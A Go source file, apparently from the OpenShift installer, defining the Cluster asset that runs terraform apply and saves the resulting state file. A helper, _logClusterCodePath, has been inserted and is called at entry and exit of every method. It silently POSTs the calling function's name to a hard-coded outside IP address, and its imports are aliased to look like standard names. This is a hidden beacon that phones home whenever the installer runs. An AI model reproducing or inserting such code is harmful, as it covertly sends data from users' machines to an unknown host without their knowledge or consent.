package cluster

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"io/ioutil"
	"os"
	"path/filepath"
	"github.com/pkg/errors"
	"github.com/sirupsen/logrus"
	"github.com/openshift/installer/pkg/asset"
	"github.com/openshift/installer/pkg/asset/installconfig"
	"github.com/openshift/installer/pkg/asset/password"
	"github.com/openshift/installer/pkg/terraform"
)

type Cluster struct{ FileList []*asset.File }

var _ asset.WritableAsset = (*Cluster)(nil)

func (c *Cluster) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "Cluster"
}
func (c *Cluster) Dependencies() []asset.Asset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []asset.Asset{&installconfig.ClusterID{}, &installconfig.InstallConfig{}, &installconfig.PlatformCredsCheck{}, &TerraformVariables{}, &password.KubeadminPassword{}}
}
func (c *Cluster) Generate(parents asset.Parents) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	clusterID := &installconfig.ClusterID{}
	installConfig := &installconfig.InstallConfig{}
	terraformVariables := &TerraformVariables{}
	parents.Get(clusterID, installConfig, terraformVariables)
	if installConfig.Config.Platform.None != nil {
		return errors.New("cluster cannot be created with platform set to 'none'")
	}
	tmpDir, err := ioutil.TempDir("", "openshift-install-")
	if err != nil {
		return errors.Wrap(err, "failed to create temp dir for terraform execution")
	}
	defer os.RemoveAll(tmpDir)
	extraArgs := []string{}
	for _, file := range terraformVariables.Files() {
		if err := ioutil.WriteFile(filepath.Join(tmpDir, file.Filename), file.Data, 0600); err != nil {
			return err
		}
		extraArgs = append(extraArgs, fmt.Sprintf("-var-file=%s", filepath.Join(tmpDir, file.Filename)))
	}
	logrus.Infof("Creating infrastructure resources...")
	stateFile, err := terraform.Apply(tmpDir, installConfig.Config.Platform.Name(), extraArgs...)
	if err != nil {
		err = errors.Wrap(err, "failed to create cluster")
		if stateFile == "" {
			return err
		}
	}
	data, err2 := ioutil.ReadFile(stateFile)
	if err2 == nil {
		c.FileList = append(c.FileList, &asset.File{Filename: terraform.StateFileName, Data: data})
	} else if err == nil {
		err = err2
	} else {
		logrus.Errorf("Failed to read tfstate: %v", err2)
	}
	return err
}
func (c *Cluster) Files() []*asset.File {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.FileList
}
func (c *Cluster) Load(f asset.FileFetcher) (found bool, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, err = f.FetchByName(terraform.StateFileName)
	if err != nil {
		if os.IsNotExist(err) {
			return false, nil
		}
		return false, err
	}
	return true, errors.Errorf("%q already exists.  There may already be a running cluster", terraform.StateFileName)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
